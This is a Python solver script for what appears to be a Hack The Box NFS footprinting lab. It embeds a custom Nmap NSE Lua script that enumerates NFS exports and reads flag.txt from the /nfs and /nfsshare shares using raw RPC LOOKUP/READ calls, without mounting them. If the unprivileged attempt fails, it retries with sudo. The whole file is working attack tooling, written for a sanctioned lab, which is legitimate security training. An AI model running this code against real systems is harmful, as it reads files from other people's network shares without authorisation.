#!/usr/bin/env python3

import argparse
import re
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Tuple


NSE_SCRIPT = r'''local rpc = require "rpc"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

portrule = shortport.port_or_service(111, "rpcbind", {"tcp", "udp"})

description = [[Read a specific file from an NFS export via RPC LOOKUP/READ without mounting.]]

author = "copilot"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "safe"}

action = function(host, port)
  local share = stdnse.get_script_args("nfsread.share")
  local file_path = stdnse.get_script_args("nfsread.file") or "flag.txt"
  local max_read = tonumber(stdnse.get_script_args("nfsread.maxread")) or 8192

  if not share then
    return "Missing script arg nfsread.share"
  end

  local nfs = rpc.NFS:new()

  local mnt_comm, handle_or_err = rpc.Helper.MountPath(host, port, share)
  if not mnt_comm then
    return "Mount failed: " .. tostring(handle_or_err)
  end

  local nfs_comm, nfs_err = rpc.Helper.NfsOpen(host, port)
  if not nfs_comm then
    rpc.Helper.UnmountPath(mnt_comm, share)
    return "NFS open failed: " .. tostring(nfs_err)
  end

  local function cleanup()
    rpc.Helper.NfsClose(nfs_comm)
    rpc.Helper.UnmountPath(mnt_comm, share)
  end

  local function lookup_path(start_handle, rel_path)
    local current = start_handle
    for segment in string.gmatch(rel_path, "[^/]+") do
      if segment ~= "." and segment ~= "" then
        local ok, lu = nfs:LookUp(nfs_comm, current, segment)
        if not ok then
          return nil, "LOOKUP failed for segment '" .. segment .. "': " .. tostring(lu)
        end
        current = lu.fhandle
      end
    end
    return current, nil
  end

  local function read_file(file_handle)
    local proc_read = 6
    local req = file_handle .. string.pack(">I8 I4", 0, max_read)
    local pkt = nfs_comm:EncodePacket(nil, proc_read, {type = rpc.Portmap.AuthType.UNIX}, req)

    if not nfs_comm:SendPacket(pkt) then
      return nil, "READ send failed"
    end

    local ok, data = nfs_comm:ReceivePacket()
    if not ok then
      return nil, "READ receive failed: " .. tostring(data)
    end

    local pos, header = nfs_comm:DecodeHeader(data, 1)
    if not header then
      return nil, "READ decode header failed"
    end

    local status
    pos, status = rpc.Util.unmarshall_uint32(data, pos)
    if status ~= rpc.NFS.StatCode[nfs_comm.version].NFS_OK then
      return nil, "READ status error: " .. tostring(status)
    end

    local follows
    pos, follows = rpc.Util.unmarshall_uint32(data, pos)
    if follows ~= 0 then
      local attrs
      pos, attrs = rpc.Util.unmarshall_nfsattr(data, pos, nfs_comm.version)
    end

    local count, eof, length, content
    pos, count = rpc.Util.unmarshall_uint32(data, pos)
    pos, eof = rpc.Util.unmarshall_uint32(data, pos)
    pos, length = rpc.Util.unmarshall_uint32(data, pos)
    pos, content = rpc.Util.unmarshall_vopaque(length, data, pos)

    return content, nil
  end

  local fh, lookup_err = lookup_path(handle_or_err, file_path)
  if not fh then
    cleanup()
    return lookup_err
  end

  local content, read_err = read_file(fh)
  cleanup()

  if not content then
    return read_err
  end

  return stdnse.format_output(true, {"share: " .. share, "file: " .. file_path, "content: " .. content})
end
'''


def run_cmd(cmd: List[str]) -> str:
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        raise RuntimeError(result.stderr.strip() or result.stdout.strip() or f"Command failed: {' '.join(cmd)}")
    return result.stdout


def discover_exports(host: str) -> List[str]:
    output = run_cmd([
        "nmap",
        "-Pn",
        "-sV",
        "-p111,2049",
        "--script",
        "nfs-showmount",
        host,
    ])

    exports: List[str] = []
    in_block = False
    for line in output.splitlines():
        if "| nfs-showmount:" in line:
            in_block = True
            continue
        if in_block:
            if line.strip().startswith("|_") or line.strip().startswith("|"):
                m = re.search(r"(\/[^\s]+)", line)
                if m:
                    exports.append(m.group(1).strip())
            else:
                in_block = False

    if not exports:
        raise RuntimeError("No NFS exports found from nmap nfs-showmount output")
    return exports


def resolve_target_exports(exports: List[str]) -> Dict[str, str]:
    result: Dict[str, str] = {}

    for export in exports:
        lower = export.lower()
        if lower.endswith("/nfsshare"):
            result["nfsshare"] = export
        elif lower.endswith("/nfs"):
            result["nfs"] = export

    if "nfs" not in result or "nfsshare" not in result:
        raise RuntimeError(f"Could not map required shares from exports: {exports}")

    return result


def read_flag_with_nse(host: str, nse_path: Path, export_path: str, use_sudo: bool) -> str:
    base_cmd = [
        "nmap",
        "-Pn",
        "-p111",
        "--script",
        str(nse_path),
        "--script-args",
        f"nfsread.share={export_path},nfsread.file=flag.txt",
        host,
    ]
    cmd = (["sudo", "-n"] + base_cmd) if use_sudo else base_cmd
    output = run_cmd(cmd)

    m = re.search(r"content:\s*(.+)", output)
    if not m:
        raise RuntimeError(f"Could not parse flag content for export {export_path}. Raw output:\n{output}")
    return m.group(1).strip()


def solve(host: str) -> Tuple[str, str]:
    exports = discover_exports(host)
    mapped = resolve_target_exports(exports)

    with tempfile.TemporaryDirectory(prefix="nfs_solver_") as tmpdir:
        nse_path = Path(tmpdir) / "nfs-readfile.nse"
        nse_path.write_text(NSE_SCRIPT, encoding="utf-8")

        # Try unprivileged first; if mountd rejects it, retry with sudo.
        try:
            nfs_flag = read_flag_with_nse(host, nse_path, mapped["nfs"], use_sudo=False)
            nfsshare_flag = read_flag_with_nse(host, nse_path, mapped["nfsshare"], use_sudo=False)
            return nfs_flag, nfsshare_flag
        except Exception as first_error:
          try:
            nfs_flag = read_flag_with_nse(host, nse_path, mapped["nfs"], use_sudo=True)
            nfsshare_flag = read_flag_with_nse(host, nse_path, mapped["nfsshare"], use_sudo=True)
            return nfs_flag, nfsshare_flag
          except Exception as sudo_error:
            raise RuntimeError(
              "NFS reads require privileged RPC source ports in this environment. "
              "Run the script as root (e.g., `sudo python nfs_footprint_solver.py <target>`). "
              f"Unprivileged error: {first_error}. Privileged retry error: {sudo_error}"
            ) from sudo_error


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve HTB NFS footprinting lab")
    parser.add_argument("host", help="Target IP or hostname")
    args = parser.parse_args()

    nfs_flag, nfsshare_flag = solve(args.host)
    print(f"nfs flag: {nfs_flag}")
    print(f"nfsshare flag: {nfsshare_flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
